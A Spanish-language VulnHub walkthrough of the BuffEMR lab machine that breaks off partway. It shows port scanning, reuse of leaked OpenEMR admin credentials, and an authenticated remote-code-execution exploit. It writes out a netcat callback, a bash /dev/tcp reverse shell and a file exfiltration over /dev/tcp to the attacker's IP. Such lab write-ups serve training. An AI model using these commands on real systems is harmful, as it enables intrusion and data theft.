@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Writeup BuffEMR</title>
+  <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+  <link href="https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css" rel="stylesheet">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
+</head>
+<body>
+
+
+
+    <div class="menu">
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="/vulnhub/">Vulnhub</a>
+        <a href="/">Home</a>
+        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
+    </div>
+    
+    <button class="openbtn" onclick="openNav()">☰</button>  
+  </div>
+  <script>
+  function openNav() {
+  if (window.innerWidth <= 1000) {
+      document.getElementById("mySidepanel").style.display = "block";
+  } else {
+      document.getElementById("mySidepanel").style.width = "25%";
+  }
+  }
+
+  function closeNav() {
+  if (window.innerWidth <= 1000) {
+      document.getElementById("mySidepanel").style.display = "none";
+  } else {
+      document.getElementById("mySidepanel").style.width = "0";
+  }
+
+  }
+
+  </script>
+
+  <div class="main">
+    <a href="https://www.vulnhub.com/entry/buffemr-101,717/"><img style="float: right; margin-left:60px; height:90px;" src="/img/vuln.png"/></a>
+
+<h1 id="buffemr">BuffEMR</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>192.168.6.165</strong>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 192.168.6.165</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 192.168.6.165 (192.168.6.165) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 192.168.6.165: icmp_seq=1 ttl=64 time=0.228 ms</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 192.168.6.165 ping statistics ---</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 0.228/0.228/0.228/0.000 ms</span></code></pre></div>
+<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor es <strong>64</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.</p>
+<table>
+<thead>
+<tr class="header">
+<th>TTL</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>64</td>
+<td>GNU/Linux</td>
+</tr>
+<tr class="even">
+<td>128</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y servicios que están asociados a estos.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n -Pn 192.168.6.165 -oN Scan</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 8%" />
+<col style="width: 91%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-p-</td>
+<td>Indica que analice todos los puertos del 1 al 65535</td>
+</tr>
+<tr class="even">
+<td>–open</td>
+<td>Únicamente se escanearan los puertos que estén abiertos</td>
+</tr>
+<tr class="odd">
+<td>-sC</td>
+<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
+</tr>
+<tr class="even">
+<td>-sV</td>
+<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>–min-rate</td>
+<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
+</tr>
+<tr class="odd">
+<td>-Pn</td>
+<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
+</tr>
+<tr class="even">
+<td>-oN</td>
+<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2024-05-16 08:22 CEST</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.6.165</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00025s latency)<span class="ex">.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65532 closed tcp ports (reset)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">21/tcp</span> open  ftp     vsftpd 3.0.3</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ftp-anon</span>: Anonymous FTP login allowed (FTP code 230)</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_drwxr-xr-x</span>    3 0        0            4096 Jun 21  2021 share</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ftp-syst</span>: </span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">STAT</span>: </span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">FTP</span> server status:</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">Connected</span> to ::ffff:192.168.6.5</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">Logged</span> in as ftp</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">TYPE</span>: ASCII</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">No</span> session bandwidth limit</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">Session</span> timeout in seconds is 300</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">Control</span> connection is plain text</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">Data</span> connections will be plain text</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">At</span> session startup, client count was 3</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="kw">|</span>      <span class="ex">vsFTPd</span> 3.0.3 - secure, fast, stable</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_End</span> of status</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">2048</span> 924cae7b01fe84f95ef7f0da91e47acf (RSA)</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 9597ebea5cf826943ca7b6b476c3279c (ECDSA)</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 cb1cd9564f7ac00125cd98f64e232e77 (ED25519)</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Apache2 Ubuntu Default Page: It works</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.29 (Ubuntu)</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true"></a><span class="ex">MAC</span> Address: 08:00:27:85:C7:87 (Oracle VirtualBox virtual NIC)</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true"></a><span class="ex">Service</span> Info: OSs: Unix, Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true"></a></span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 9.15 seconds</span></code></pre></div>
+<p>Los puertos que se han descubierto son:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Puertos</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>21</td>
+<td>FTP</td>
+<td>vsftpd 3.0.3</td>
+</tr>
+<tr class="even">
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 7.6p1</td>
+</tr>
+<tr class="odd">
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.29</td>
+</tr>
+</tbody>
+</table>
+<p>Vemos que podemos acceder al servicio <strong>FTP</strong> como el usuario <strong>Anonymous</strong>.</p>
+<img src="Img/Pasted image 20240516082648.png">
+<p>Al acceder vemos un directorio.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="fu">ftp</span> 192.168.6.165</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">Connected</span> to 192.168.6.165.</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="ex">220</span> (vsFTPd 3.0.3)</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a><span class="ex">Name</span> (192.168.6.165:pringles)<span class="bu">:</span> anonymous</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="ex">331</span> Please specify the password.</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a><span class="ex">Password</span>:</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="ex">230</span> Login successful.</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a><span class="ex">Remote</span> system type is UNIX.</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a><span class="ex">Using</span> binary mode to transfer files.</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="fu">ftp</span><span class="op">&gt;</span> dir</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="ex">150</span> Here comes the directory listing.</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>    3 0        0            4096 Jun 21  2021 share</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a><span class="ex">226</span> Directory send OK.</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a><span class="fu">ftp</span><span class="op">&gt;</span> </span></code></pre></div>
+<p>Nos descargamos todo el contenido del <strong>FTP</strong>.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a>❯ <span class="fu">wget</span> -r ftp://192.168.6.165</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-r</td>
+<td>Descarga recursivamente.</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240516091821.png">
+<h2 id="búsqueda-de-vulnerabilidades">Búsqueda de Vulnerabilidades</h2>
+<p>Viendo que está el puerto <strong>80</strong> accedemos a la página.</p>
+<p>Y como podemos ver nos muestra la pagina default del servidor web <strong>Apache</strong>.</p>
+<img src="Img/Pasted image 20240516104955.png">
+<p>Utilizando la herramienta <strong>gobuster</strong> para buscar rutas en la pagina.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="ex">gobuster</span> dir -u <span class="st">&quot;http://192.168.6.165/&quot;</span> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --add-slash</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>dir</td>
+<td>Utiliza el modo de enumeración de directorios y archivos.</td>
+</tr>
+<tr class="even">
+<td>-u</td>
+<td>Especifica la URL a la cual se quiere escanear.</td>
+</tr>
+<tr class="odd">
+<td>-w</td>
+<td>Especifica el diccionario que se utilizara parar el escaneo.</td>
+</tr>
+<tr class="even">
+<td>-t 200</td>
+<td>Indica que se utilicen 200 subprocesos simultáneamente para aumentar la velocidad de descubrimiento.</td>
+</tr>
+<tr class="odd">
+<td>–add-slash</td>
+<td>Agrega una barra diagonal “/” al final de cada directorio encontrado durante la enumeración.</td>
+</tr>
+<tr class="even">
+<td>-o</td>
+<td>Se indica que se quiere guardar el resultado en un archivo.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>===============================================================</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">Gobuster</span> v3.1.0</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="ex">by</span> OJ Reeves (@TheColonial) <span class="kw">&amp;</span> <span class="ex">Christian</span> Mehlmauer (@firefart)</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a>===============================================================</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a>[<span class="ex">+</span>] Url:                     http://192.168.6.165/</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a>[<span class="ex">+</span>] Method:                  GET</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a>[<span class="ex">+</span>] Threads:                 200</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a>[<span class="ex">+</span>] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a>[<span class="ex">+</span>] Negative Status codes:   404</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a>[<span class="ex">+</span>] User Agent:              gobuster/3.1.0</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a>[<span class="ex">+</span>] Add Slash:               true</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a>[<span class="ex">+</span>] Timeout:                 10s</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a>===============================================================</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a><span class="ex">2024/05/16</span> 10:57:47 Starting gobuster in directory enumeration mode</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a>===============================================================</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a><span class="ex">/icons/</span>               (Status: 403) [<span class="ex">Size</span>: 278]</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a><span class="ex">/server-status/</span>       (Status: 403) [<span class="ex">Size</span>: 278]</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a><span class="ex">/openemr/</span>             (Status: 302) [<span class="ex">Size</span>: 0] [--<span class="op">&gt;</span> interface/login/login.php?site=default]</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a>                                                                                          </span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a>===============================================================</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a><span class="ex">2024/05/16</span> 11:00:58 Finished</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a>===============================================================</span></code></pre></div>
+<p>Vemos la ruta <strong>openemr</strong>.</p>
+<img src="Img/Pasted image 20240516115244.png">
+<p>Si accedo, nos muestra un <strong>panel de login</strong>.</p>
+<img src="Img/Pasted image 20240516115536.png">
+<p>Buscando por el contenido del FTP, vemos un directorio <strong>test</strong> donde reside un archivo <strong>test.accounts</strong> que contiene unas <strong>credenciales</strong>.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>❯ <span class="ex">catn</span> 192.168.6.165/share/openemr/tests/test.accounts</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">this</span> is a test admin account:</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a><span class="ex">admin</span>:Monster123</span></code></pre></div>
+<p>Si añadimos esas <strong>credenciales</strong> al <strong>panel de login</strong>, vemos que nos funciona.</p>
+<img src="Img/Pasted image 20240516120011.png">
+<img src="Img/Pasted image 20240516120042.png">
+<p>Viendo la pestaña <strong>About</strong>.</p>
+<img src="Img/Pasted image 20240516120114.png">
+<p>Vemos la versión del <strong>OpenEMR</strong>.</p>
+<img src="Img/Pasted image 20240516120218.png">
+<h2>Explotación</h2>
+<p>Su buscamos exploits con <strong>searchsploit</strong> para esa <strong>versión</strong>, vemos que hay uno que permite ejecutar <strong>comandos remotos</strong> estando <strong>autenticado</strong>.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>❯ <span class="ex">searchsploit</span> openemr 5.0.1</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="ex">------------------------------------------------------------------------------------------------------------------------------------------------------</span> ---------------------------------</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a> <span class="ex">Exploit</span> Title                                                                                                                                        <span class="kw">|</span>  <span class="ex">Path</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">------------------------------------------------------------------------------------------------------------------------------------------------------</span> ---------------------------------</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1 - <span class="st">&#39;controller&#39;</span> Remote Code Execution                                                                                                    <span class="kw">|</span> <span class="ex">php/webapps/48623.txt</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1 - Remote Code Execution (1)                                                                                                             <span class="kw">|</span> <span class="ex">php/webapps/48515.py</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1 - Remote Code Execution (Authenticated) <span class="kw">(</span><span class="ex">2</span><span class="kw">)</span>                                                                                             <span class="kw">|</span> <span class="ex">php/webapps/49486.rb</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.3 - <span class="st">&#39;manage_site_files&#39;</span> Remote Code Execution (Authenticated)                                                                           <span class="kw">|</span> <span class="ex">php/webapps/49998.py</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.3 - <span class="st">&#39;manage_site_files&#39;</span> Remote Code Execution (Authenticated) <span class="kw">(</span><span class="ex">2</span><span class="kw">)</span>                                                                       <span class="kw">|</span> <span class="ex">php/webapps/50122.rb</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.3 - (Authenticated) <span class="ex">Arbitrary</span> File Actions                                                                                              <span class="kw">|</span> <span class="ex">linux/webapps/45202.txt</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.3 - Authentication Bypass                                                                                                               <span class="kw">|</span> <span class="ex">php/webapps/50017.py</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.3 - Remote Code Execution (Authenticated)                                                                                               <span class="kw">|</span> <span class="ex">php/webapps/45161.py</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.7 - <span class="st">&#39;fileName&#39;</span> Path Traversal (Authenticated)                                                                                           <span class="kw">|</span> <span class="ex">php/webapps/50037.py</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true"></a><span class="ex">OpenEMR</span> 5.0.1.7 - <span class="st">&#39;fileName&#39;</span> Path Traversal (Authenticated) <span class="kw">(</span><span class="ex">2</span><span class="kw">)</span>                                                                                       <span class="kw">|</span> <span class="ex">php/webapps/50087.rb</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true"></a><span class="ex">------------------------------------------------------------------------------------------------------------------------------------------------------</span> ---------------------------------</span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true"></a><span class="ex">Shellcodes</span>: No Results</span></code></pre></div>
+<p>Nos lo descargamos.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>❯ <span class="ex">searchsploit</span> -m php/webapps/45161.py</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>  <span class="ex">Exploit</span>: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>      <span class="ex">URL</span>: https://www.exploit-db.com/exploits/45161</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>     <span class="ex">Path</span>: /usr/share/exploitdb/exploits/php/webapps/45161.py</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>    <span class="ex">Codes</span>: N/A</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a> <span class="ex">Verified</span>: True</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a><span class="ex">File</span> Type: ASCII text</span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a><span class="ex">Copied</span> to: /home/pringles/Vulnhub/BuffEMR/exploits/45161.py</span></code></pre></div>
+<p>Si nos enviamos un <strong>whoami</strong> vemos que nos funciona.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>❯ <span class="ex">python2.7</span> 45161.py -u admin -p Monster123 -c <span class="st">&quot;whoami | nc 192.168.6.5 443&quot;</span> http://192.168.6.165/openemr</span></code></pre></div>
+<img src="Img/Pasted image 20240516122427.png">
+<p>Sabiendo esto, ahora nos enviamos una <strong>ReverseShell</strong>.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a>❯ <span class="ex">python2.7</span> 45161.py -u admin -p Monster123 -c <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/192.168.6.5/443 0&gt;&amp;1&quot;</span> http://192.168.6.165/openemr</span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 443</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 443 ...</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a><span class="ex">connect</span> to [192.168.6.5] from (UNKNOWN) [<span class="ex">192.168.6.165</span>] 59792</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="ex">bash</span>: cannot set terminal process group (691)<span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="ex">bash</span>: no job control in this shell</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a><span class="ex">www-data@buffemr</span>:/var/www/html/openemr/interface/main$ </span></code></pre></div>
+<p>Investigando por el sistema, vemos en el directorio <strong>/var</strong> un archivo comprimido con el nombre <strong>user.zip</strong>.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="ex">www-data@buffemr</span>:/var$ ls -l      </span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="fu">ls</span> -l</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a><span class="ex">total</span> 56</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>  2 root root     4096 May 15 12:03 backups</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 18 root root     4096 Jun 19  2021 cache</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a><span class="ex">drwxrwsrwt</span>  2 root whoopsie 4096 May 15 12:08 crash</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 68 root root     4096 Jun 18  2021 lib</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true"></a><span class="ex">drwxrwsr-x</span>  2 root staff    4096 Apr 24  2018 local</span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true"></a><span class="ex">lrwxrwxrwx</span>  1 root root        9 Jun 18  2021 lock -<span class="op">&gt;</span> /run/lock</span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span> 13 root syslog   4096 May 16 02:00 log</span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true"></a><span class="ex">drwxrwsr-x</span>  2 root mail     4096 Aug  6  2020 mail</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true"></a><span class="ex">drwxrwsrwt</span>  2 root whoopsie 4096 Aug  6  2020 metrics</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>  2 root root     4096 Aug  6  2020 opt</span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true"></a><span class="ex">lrwxrwxrwx</span>  1 root root        4 Jun 18  2021 run -<span class="op">&gt;</span> /run</span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 13 root root     4096 May 16 01:57 snap</span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>  7 root root     4096 Aug  6  2020 spool</span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true"></a><span class="ex">drwxrwxrwt</span>  2 root root     4096 May 16 01:55 tmp</span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true"></a><span class="ex">-rw-r--r--</span>  1 root root      309 Jun 21  2021 user.zip</span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>  3 root root     4096 Jun 18  2021 www</span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true"></a><span class="ex">www-data@buffemr</span>:/var$ </span></code></pre></div>
+<p>Nos lo pasamos a nuestra máquina,para poder descomprimirlo.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">www-data@buffemr</span>:/var$ cat <span class="op">&lt;</span> user.zip <span class="op">&gt;</span> /dev/tcp/192.168.6.5/1234</span>
